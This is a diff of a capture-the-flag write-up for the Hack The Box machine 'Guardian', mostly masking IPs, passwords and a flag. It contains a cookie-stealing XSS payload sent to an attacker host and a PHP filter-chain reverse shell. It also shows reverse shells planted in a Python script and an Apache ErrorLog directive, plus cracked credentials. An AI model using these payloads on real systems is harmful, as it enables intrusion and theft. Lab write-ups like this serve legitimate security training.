@@ -1,5 +1,6 @@
 ---
 title: Guardian [Hard]
+published: false
 date: 2025-09-03
 tags: [htb, linux, nmap, subdomain, fuzzing, idor, gitea, cve-2025-22131, excel, csrf, lfi, rce, mysql, password cracking, php filter wrapper, regex, hijacking, penelope, apache config, safeapache2ctl, hashcat]
 categories: [HTB Writeups]
@@ -15,9 +16,9 @@ Author: [sl1de](https://app.hackthebox.com/users/1187088)
 ## Enumeration
 ### Nmap
 ```bash
-└─$ sudo nmap -Pn -sC -sV 10.129.150.76
+└─$ sudo nmap -Pn -sC -sV 10.129.xx.xx
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-31 00:06 EDT
-Nmap scan report for 10.129.150.76
+Nmap scan report for 10.129.xx.xx
 Host is up (1.6s latency).
 Not shown: 998 closed tcp ports (reset)
 PORT   STATE SERVICE VERSION
@@ -36,7 +37,7 @@ Nmap done: 1 IP address (1 host up) scanned in 96.50 seconds
 
 Add these to `/etc/hosts` file:
 ```bash
-10.129.150.76     guardian.htb
+10.129.xx.xx     guardian.htb
 ```
 
 Let's check the web server.
@@ -52,7 +53,7 @@ When hover to `Student Portal`, we got another subdomain.
 
 We gonna update `/etc/hosts` file:
 ```bash
-10.129.150.76     guardian.htb portal.guardian.htb
+10.129.xx.xx     guardian.htb portal.guardian.htb
 ```
 
 Then we access to `http://portal.guardian.htb`.
@@ -282,11 +283,11 @@ From here, we are assume that what if we change our id to other user, there may 
 ![Guardian Website](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_website-login-14.png)
 
 Changing the id from `13` to `2` and we can see the chat session between `jamil.enockson` and admin. <br>
-Found out the admin give the password for gitea which was `DHsNnk3V503`. <br>
+Found out the admin give the password for gitea which was `DHsNnk3Vxxx`. <br>
 &rarr; We gonna update `/etc/hosts` file.
 
 ```bash
-10.129.150.76     guardian.htb portal.guardian.htb gitea.guardian.htb
+10.129.xx.xx     guardian.htb portal.guardian.htb gitea.guardian.htb
 ```
 
 ![Guardian Website](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_website-login-15.png)
@@ -333,7 +334,7 @@ For this step, we can try manually or we can use this [FSheet](https://www.treeg
 
 ![Guardian Excel Sheet Name](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_excel-sheet-name.png)
 
-We gonna use this payload `"><img src=x onerror=fetch("http://10.10.16.36/?c="+document.cookie)>` in order to grab the lecturer cookie to escalate them.
+We gonna use this payload `"><img src=x onerror=fetch("http://10.xx.xx.xx/?c="+document.cookie)>` in order to grab the lecturer cookie to escalate them.
 
 ![Guardian Excel Export](/assets/img/guardian-htb-release-area-machine/guardian-htb-release-area-machine_excel-export.png)
 
@@ -393,9 +394,9 @@ After click `Create Notice`, there will be a pop out waiting for approval from a
 ```bash
 └─$ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-10.129.150.76 - - [31/Aug/2025 11:03:25] "GET / HTTP/1.1" 200 -
-10.129.150.76 - - [31/Aug/2025 11:03:28] code 404, message File not found
-10.129.150.76 - - [31/Aug/2025 11:03:28] "GET /favicon.ico HTTP/1.1" 404 -
+10.129.xx.xx - - [31/Aug/2025 11:03:25] "GET / HTTP/1.1" 200 -
+10.129.xx.xx - - [31/Aug/2025 11:03:28] code 404, message File not found
+10.129.xx.xx - - [31/Aug/2025 11:03:28] "GET /favicon.ico HTTP/1.1" 404 -
 ```
 
 Wait for few second and admin click our link to review and we got the request back. <br>
@@ -643,9 +644,9 @@ Hold the breath for few second.
 ```bash
 └─$ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-10.129.150.76 - - [31/Aug/2025 11:24:09] "GET /csrf.html HTTP/1.1" 200 -
-10.129.150.76 - - [31/Aug/2025 11:24:10] code 404, message File not found
-10.129.150.76 - - [31/Aug/2025 11:24:10] "GET /favicon.ico HTTP/1.1" 404 -
+10.129.xx.xx - - [31/Aug/2025 11:24:09] "GET /csrf.html HTTP/1.1" 200 -
+10.129.xx.xx - - [31/Aug/2025 11:24:10] code 404, message File not found
+10.129.xx.xx - - [31/Aug/2025 11:24:10] "GET /favicon.ico HTTP/1.1" 404 -
 ```
 
 Admin has review our link and as the flow, our new account `2fa0n` has been created. <br>
@@ -722,8 +723,8 @@ There we go, got our result, now let's leverage this point to reverse shell.
 > *Remeber to add `,system.php` at the end incase forgot it and it will not working :)*
 
 ```bash
-└─$ python3 php_filter_chain_generator.py --chain '<?php system("bash -c '\''bash -i >& /dev/tcp/10.10.16.36/4444 0>&1'\''");?>'
-[+] The following gadget chain will generate the following code : <?php system("bash -c 'bash -i >& /dev/tcp/10.10.16.36/4444 0>&1'");?> (base64 value: PD9waHAgc3lzdGVtKCJiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjM2LzQ0NDQgMD4mMSciKTs/Pg)
+└─$ python3 php_filter_chain_generator.py --chain '<?php system("bash -c '\''bash -i >& /dev/tcp/10.xx.xx.xx/4444 0>&1'\''");?>'
+[+] The following gadget chain will generate the following code : <?php system("bash -c 'bash -i >& /dev/tcp/10.xx.xx.xx/4444 0>&1'");?> (base64 value: PD9waHAgc3lzdGVtKCJiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjM2LzQ0NDQgMD4mMSciKTs/Pg)
 php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
 ```
 
@@ -731,7 +732,7 @@ Setup our kali server via [penelope](https://github.com/brightio/penelope).
 
 ```bash
 └─$ penelope -p 4444                                                                                                            
-[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 172.16.147.139 • 172.17.0.1 • 10.10.16.36
+[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 172.xx.xx.xx • 172.xx.xx.xx • 10.xx.xx.xx
 - 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
 ```
 
@@ -739,13 +740,13 @@ Copy the output and paste and send it.
 
 ```bash
 └─$ penelope -p 4444                                                                                                            
-[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 172.16.147.139 • 172.17.0.1 • 10.10.16.36
+[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 172.xx.xx.xx • 172.xx.xx.xx • 10.xx.xx.xx
 - 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
-[+] Got reverse shell from guardian~10.129.101.248-Linux-x86_64 😍 Assigned SessionID <1>
+[+] Got reverse shell from guardian~10.129.xx.xx-Linux-x86_64 😍 Assigned SessionID <1>
 [+] Attempting to upgrade shell to PTY...
 [+] Shell upgraded successfully using /usr/bin/python3! 💪
 [+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
-[+] Logging to /home/kali/.penelope/guardian~10.129.101.248-Linux-x86_64/2025_09_01-09_15_08-425.log 📜
+[+] Logging to /home/kali/.penelope/guardian~10.129.xx.xx-Linux-x86_64/2025_09_01-09_15_08-425.log 📜
 ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 www-data@guardian:~/portal.guardian.htb/admin$
 ```
@@ -778,7 +779,7 @@ So there was port `3306` open and we also see from the source code the `config.p
 Let's access `mysql`.
 
 ```bash
-www-data@guardian:~$ mysql -h 127.0.0.1 -u root -pGu4rd14n_un1_1s_th3_b3st guardiandb
+www-data@guardian:~$ mysql -h 127.0.0.1 -u root -pGu4rd14n_un1_1s_th3_xxxx guardiandb
 mysql: [Warning] Using a password on the command line interface can be insecure.
 Reading table information for completion of table and column names
 You can turn off this feature to get a quicker startup with -A
@@ -992,16 +993,16 @@ To make the crackable work, we need to add the hashcat with following format. <b
 
 ```bash
 └─$ hashcat -m 1410 hashes.txt -w 3 -O /usr/share/wordlists/rockyou.txt --username --show
-admin:694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6:8Sb)tM1vs1SS:fakebake000
-jamil.enockson:c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250:8Sb)tM1vs1SS:copperhouse56
+admin:694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6:8Sb)tM1vs1SS:fakebakexxx
+jamil.enockson:c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250:8Sb)tM1vs1SS:copperhousexx
 ```
 
 We got password from `admin` and `jamil.enockson`. <br>
 &rarr; The password for admin seems so sus so we gonna use `jamil.enockson` to ssh.
 
 ```bash
-└─$ ssh jamil@10.129.101.248         
-jamil@10.129.101.248's password: 
+└─$ ssh jamil@10.129.xx.xx         
+jamil@10.129.xx.xx's password: 
 jamil@guardian:~$ ls -la
 total 28
 drwxr-x--- 3 jamil jamil 4096 Jul 14 16:57 .
@@ -1014,7 +1015,7 @@ lrwxrwxrwx 1 root  root     9 Apr 12 10:15 .mysql_history -> /dev/null
 -rw-r--r-- 1 jamil jamil  807 Jan  6  2022 .profile
 -rw-r----- 1 root  jamil   33 Sep  1 09:58 user.txt
 jamil@guardian:~$ cat user.txt
-71eb00a45adafa3f8974c364e7ba2f5c
+71eb00xxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
 Nailed the `user.txt` flag.
@@ -1167,14 +1168,14 @@ def system_status():
     print("System:", platform.system(), platform.release())
     print("CPU usage:", psutil.cpu_percent(), "%")
     print("Memory usage:", psutil.virtual_memory().percent, "%")
-    subprocess.run(["/bin/bash", "-c", "bash -i >& /dev/tcp/10.10.16.36/5555 0>&1"])
+    subprocess.run(["/bin/bash", "-c", "bash -i >& /dev/tcp/10.xx.xx.xx/5555 0>&1"])
 ```
 
 Setup our kali listener.
 
 ```bash
 └─$ penelope -p 5555                                               
-[+] Listening for reverse shells on 0.0.0.0:5555 →  127.0.0.1 • 172.16.147.139 • 172.17.0.1 • 10.10.16.36
+[+] Listening for reverse shells on 0.0.0.0:5555 →  127.0.0.1 • 172.xx.xx.xx • 172.xx.xx.xx • 10.xx.xx.xx
 - 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
 ```
 
@@ -1193,13 +1194,13 @@ Wait for a few second.
 
 ```bash
 └─$ penelope -p 5555                                               
-[+] Listening for reverse shells on 0.0.0.0:5555 →  127.0.0.1 • 172.16.147.139 • 172.17.0.1 • 10.10.16.36
+[+] Listening for reverse shells on 0.0.0.0:5555 →  127.0.0.1 • 172.xx.xx.xx • 172.xx.xx.xx • 10.xx.xx.xx
 - 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
-[+] Got reverse shell from guardian~10.129.101.248-Linux-x86_64 😍 Assigned SessionID <1>
+[+] Got reverse shell from guardian~10.129.xx.xx-Linux-x86_64 😍 Assigned SessionID <1>
 [+] Attempting to upgrade shell to PTY...
 [+] Shell upgraded successfully using /usr/bin/python3! 💪
 [+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
-[+] Logging to /home/kali/.penelope/guardian~10.129.101.248-Linux-x86_64/2025_09_01-09_53_36-840.log 📜
+[+] Logging to /home/kali/.penelope/guardian~10.129.xx.xx-Linux-x86_64/2025_09_01-09_53_36-840.log 📜
 ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 mark@guardian:/opt/scripts/utilities/utils$
 ```
@@ -1265,14 +1266,14 @@ ServerRoot "/etc/apache2"
 ServerName localhost
 PidFile /tmp/apache-rs.pid
 Listen 127.0.0.1:8080
-ErrorLog "|/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.16.36/6666 0>&1'"
+ErrorLog "|/bin/bash -c '/bin/bash -i >& /dev/tcp/10.xx.xx.xx/6666 0>&1'"
 ```
 
 Setup our listener.
 
 ```bash
 └─$ penelope -p 6666                                               
-[+] Listening for reverse shells on 0.0.0.0:6666 →  127.0.0.1 • 172.16.147.139 • 172.17.0.1 • 10.10.16.36
+[+] Listening for reverse shells on 0.0.0.0:6666 →  127.0.0.1 • 172.xx.xx.xx • 172.xx.xx.xx • 10.xx.xx.xx
 - 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
 ```
 
@@ -1286,14 +1287,14 @@ Hold on.
 
 ```bash
 └─$ penelope -p 6666                                               
-[+] Listening for reverse shells on 0.0.0.0:6666 →  127.0.0.1 • 172.16.147.139 • 172.17.0.1 • 10.10.16.36
+[+] Listening for reverse shells on 0.0.0.0:6666 →  127.0.0.1 • 172.xx.xx.xx • 172.xx.xx.xx • 10.xx.xx.xx
 - 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
